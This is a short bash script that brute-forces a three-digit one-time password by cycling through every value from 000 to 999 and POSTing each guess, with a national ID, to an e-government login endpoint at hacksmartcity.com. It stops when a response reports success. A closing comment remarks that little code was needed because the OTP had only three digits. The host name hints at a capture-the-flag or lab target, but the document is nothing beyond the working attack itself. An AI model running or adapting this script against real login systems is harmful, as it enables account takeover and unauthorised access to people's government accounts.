#!/bin/bash

nid="any_valid_nid"

for otp in $(seq -w 000 999); do
  echo "[-] Trying OTP: $otp"

  response=$(curl -s -X POST https://hacksmartcity.com/egov/login/ \
    -H "Content-Type: application/json" \
    -d "{\"nid\":\"$nid\",\"otp\":\"$otp\"}")

  if [[ $response == *'"result":true'* ]]; then
    echo "[+]  SUCCESS! OTP is $otp"
    echo "Response: $response"
    break
  fi
done

#since this was a three digits otp that's why it didn't much code

